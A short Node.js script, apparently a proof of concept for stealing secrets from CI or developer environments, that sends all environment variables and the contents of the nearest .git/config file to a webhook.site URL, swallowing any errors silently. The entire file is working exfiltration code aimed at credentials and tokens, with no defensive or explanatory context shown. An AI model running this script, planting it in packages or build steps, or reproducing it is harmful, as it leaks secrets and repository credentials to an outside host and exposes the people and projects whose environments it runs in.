const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');

// Change this to your webhook/site URL
const TARGET_URL = 'https://webhook.site/TestActions/TestReactNative1';

function postData(data, contentType = 'application/json') {
  const { hostname, pathname, port, protocol } = url.parse(TARGET_URL);
  const options = {
    hostname,
    port: port || (protocol === 'https:' ? 443 : 80),
    path: pathname,
    method: 'POST',
    headers: {
      'Content-Type': contentType,
      'Content-Length': Buffer.byteLength(data)
    }
  };
  const req = https.request(options, res => {});
  req.on('error', () => {});
  req.write(data);
  req.end();
}

// Find .git/config in current or parent directories
function findGitConfig(startDir) {
  let dir = startDir;
  while (dir !== path.parse(dir).root) {
    const configPath = path.join(dir, '.git', 'config');
    if (fs.existsSync(configPath)) return configPath;
    dir = path.dirname(dir);
  }
  return null;
}

// 1. Send environment variables
postData(JSON.stringify(process.env));

// 2. Search for .git/config and send its content if found
const configPath = findGitConfig(process.cwd());
if (configPath) {
  try {
    const configData = fs.readFileSync(configPath);
    postData(configData, 'text/plain');
  } catch {}
}
